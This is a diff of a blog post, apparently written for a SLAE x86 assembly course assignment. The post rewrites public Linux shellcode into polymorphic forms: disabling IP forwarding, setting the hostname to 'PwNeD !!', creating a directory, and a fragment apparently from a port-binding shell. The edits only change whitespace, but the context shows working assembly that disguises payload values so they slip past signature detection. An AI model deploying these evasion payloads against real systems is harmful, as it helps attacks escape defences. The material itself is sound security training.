@@ -136,10 +136,10 @@ _start:
 ```
 My idea is to replace the series of `push` instructions in the original shellcode with equivalent instructions, changing the `push` values at the same time.  Only the first `push` value is hardcoded (with some number subtracted from it). We will derive values for the next `push` instruction by adding/subtracting numbers from previously pushed value. The original instructions are commented out and equivalent instruction are written below it in the polymorphic version. This convention is followed throughtout this post. Polymorphic version of the above shellcode is as follows:
 ```nasm
-; Title 		: SLAE Linux/x86 - Assignment-6.1
+; Title 	: SLAE Linux/x86 - Assignment-6.1
 ; Description	: Polymorphic version of Linux/x86 - Set '/proc/sys/net/ipv4/ip_forward' to '0' & exit() - 83 Bytes
-; Original 		: http://shell-storm.org/shellcode/files/shellcode-848.php
-; Author		: Rizal Muhammed (UB3RSiCK)
+; Original 	: http://shell-storm.org/shellcode/files/shellcode-848.php
+; Author	: Rizal Muhammed (UB3RSiCK)
 ; Student ID	: SLAE 933
 ; Shellcode Len.: 106 Bytes (~27.8% increase)
 ;
@@ -156,7 +156,7 @@ _start:
         
 	;push dword 0x64726177
 	push dword 0x63716076
-	pop ebx					; 0x64726177 = 0x63716076 + 0x01010101
+	pop ebx				; 0x64726177 = 0x63716076 + 0x01010101
 	add ebx, 0x01010101
 	push ebx
         
@@ -174,7 +174,7 @@ _start:
 
   	;push dword 0x74656e2f
 	sub ebx, 0x20afb01		; 0x74656e2f = 0x7670692f - 0x20afb01 + 1
-	inc ebx					; +1 to avoid null byte [0x7670692f - 0x74656e2f] = [0x20afb00]
+	inc ebx				; +1 to avoid null byte [0x7670692f - 0x74656e2f] = [0x20afb00]
 	push ebx
 
   	;push dword 0x2f737973
@@ -281,10 +281,10 @@ Making sure the original is working.
 ![6.2-shellcode-622-og-running](/assets/SLAE-x86/6.2-shellcode-622-og-running.PNG)
 The polymorphic version of the above shellcode is as follows:
 ```nasm
-; Title 		: SLAE Linux/x86 - Assignment-6.2
+; Title 	: SLAE Linux/x86 - Assignment-6.2
 ; Description	: Polymorphic version of Linux/x86 - sys_sethostname(PwNeD !!, 8) - 32 bytes by gunslinger_
-; Original 		: http://shell-storm.org/shellcode/files/shellcode-622.php
-; Author		: Rizal Muhammed (UB3RSiCK)
+; Original 	: http://shell-storm.org/shellcode/files/shellcode-622.php
+; Author	: Rizal Muhammed (UB3RSiCK)
 ; Student ID	: SLAE 933
 ; Shellcode Len.: 28 bytes (4 Bytes smaller than original)
 ;
@@ -317,13 +317,13 @@ _start:
 ;Polymorphic
 
 	xor eax,eax
-	push eax					; push null terminator
+	push eax			; push null terminator
 	push dword 0x21212044		; python -c 'print "PwNeD !!"[::-1].encode("hex")'
 	push dword 0x654e7750
-	mov ebx, esp				; ebx = char __user *name
-	mov al, 0x4a				; sys_sethostname = 0x4a
+	mov ebx, esp			; ebx = char __user *name
+	mov al, 0x4a			; sys_sethostname = 0x4a
 	push 0x8
-	pop ecx						; ecx = int len
+	pop ecx				; ecx = int len
 	int 0x80
 
 	; exit
@@ -364,10 +364,10 @@ Making sure its working.
 Polymorphic version of the shellcode:
 
 ```nasm
-; Title 		: SLAE Linux/x86 - Assignment-6.3
+; Title 	: SLAE Linux/x86 - Assignment-6.3
 ; Description	: Polymorphic version of Linux/x86 - mkdir() & exit() - 36 bytes by zillion
-; Original 		: http://shell-storm.org/shellcode/files/shellcode-542.php
-; Author		: Rizal Muhammed (UB3RSiCK)
+; Original 	: http://shell-storm.org/shellcode/files/shellcode-542.php
+; Author	: Rizal Muhammed (UB3RSiCK)
 ; Student ID	: SLAE 933
 ; Shellcode Len.: 29 Bytes (7 bytes less than the original)
 ;
@@ -552,7 +552,7 @@ _start:
 	add edx,0x7e
 	push edx
 
-    	;push WORD 0x3930  ; Port 12345
+    	;push WORD 0x3930  	; Port 12345
 	add dx, 0x37b1		; dx = 0x017f ; 0x37b1 + 0x017f = 0x3930
 	push word dx
 
